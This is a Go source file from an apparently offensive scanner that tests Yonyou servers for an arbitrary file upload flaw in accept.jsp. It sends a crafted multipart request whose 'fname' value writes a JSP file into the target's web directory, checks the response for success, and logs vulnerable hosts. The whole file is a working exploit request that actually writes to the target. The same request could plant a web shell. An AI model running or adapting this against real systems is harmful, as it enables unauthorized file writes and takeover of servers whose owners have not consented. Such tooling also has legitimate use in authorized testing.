package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func AcceptuploadScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	acceptupload := "用友 accept 任意文件上传漏洞"
	urls := address + "/aim/equipmap/accept.jsp"
	response, err := client.Post(urls, "multipart/form-data; boundary=---------------------------16314487820932200903769468567", strings.NewReader("-----------------------------16314487820932200903769468567\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"oklog.txt\"\r\nContent-Type: text/plain\r\n\r\nok\r\n-----------------------------16314487820932200903769468567\r\nContent-Disposition: form-data; name=\"fname\"\r\n\r\n\\webapps\\nc_web\\oklog.jsp\r\n-----------------------------16314487820932200903769468567--"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, acceptupload)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, urls)
		}
		return
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, acceptupload, err)
			fmt.Println(output)
			return
		}

		if strings.Contains(string(body), "afterUpload(1)") {
			result := acceptupload + "：" + urls
			//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result, filename)
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, acceptupload, urls)
			fmt.Println(output)
		} else {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, acceptupload, response.StatusCode)
			fmt.Println(output)
		}
	}
}
